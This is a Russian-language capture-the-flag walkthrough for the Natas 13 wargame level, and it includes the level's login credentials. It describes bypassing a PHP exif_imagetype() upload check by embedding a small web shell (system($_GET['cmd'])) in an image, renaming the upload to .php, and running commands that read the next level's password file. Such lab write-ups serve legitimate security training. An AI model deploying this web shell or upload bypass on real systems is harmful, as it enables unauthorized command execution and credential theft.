Natas13

login:natas13
password:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

1) На главной странице как и на прошлом уровне есть возможность загрузки изображений, но в этот раз кроме ограничения в 1кб сказано что так же будет
проверятся расширение файла. Есть возможность просотреть исходный код(View sourcecode)
![изображение](https://user-images.githubusercontent.com/54982244/173426534-b121b338-04ae-4bc2-bd78-97c2995d61bb.png)
2) Перейдем в исходный код и попробуем узнать каким образом происходит проверка расширения файла. В коде можно увидить такую строку.

        else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
        } 
 exif_imagetype() считывает начальные байты изображения и проверяет их сигнатуру. (https://www.php.net/manual/ru/function.exif-imagetype.php)
 
 Значит эта функция считает первые байты файла и по ним определит является ли наш файл изображением.
 
 3) За исключением дополнительной проверки начальных байт функцией exif_imagetype() ничего не изменилось с прошлого уровня. Так же как и раньше
 загружаему файлу присваевается расширения на основе, строки (имени файла) в hidden параметре.
 
        <input type="hidden" name="filename" value="7alb45pad1.jpg" />
        
 4) Обойдем проверку функции exif_imagetype() с помощью редактирования файла в hex редакторе. (Варианты) 
    1.Взять легетимные начальные байты изображения встроить их в .php файл.
    2.Взять картинку и вписать в нее вредносной код.
   
php код

      <?php
          if(isset($_GET['cmd']))
          {
              system($_GET['cmd']);
          }
      ?>
 
 5) Скачал картинку подходящую по размеру и открыл ее в hex редаторе. Не повредив начальные байты встроим в нее php код.
 ![изображение](https://user-images.githubusercontent.com/54982244/173428836-b9a38d84-7513-41f9-82b1-50a1c6226ba6.png)
 
 6)Перехватим запрос загрузки файла и поменяем строку со скрытым параметром, на основе которого и присваивается расширение к итоговому именя файла.
 ![изображение](https://user-images.githubusercontent.com/54982244/173429658-23df1486-d4e0-495d-a791-e635dce279a9.png)
 7) Перейдем к загруженому файлу по сформированной ссылке. Для проверки отправим GET запрос ?cmd=id. Видим вывод системной команды.
 ![изображение](https://user-images.githubusercontent.com/54982244/173429929-50e6b9ea-106f-449d-93b2-4d2d55ac1f8b.png)
 8) Забираем пароль к следующему уровню (cat%20/etc/natas_webpass/natas14)
![изображение](https://user-images.githubusercontent.com/54982244/173430142-02f36f08-9615-4f5a-b9b2-9912763e5219.png)


 
        
   
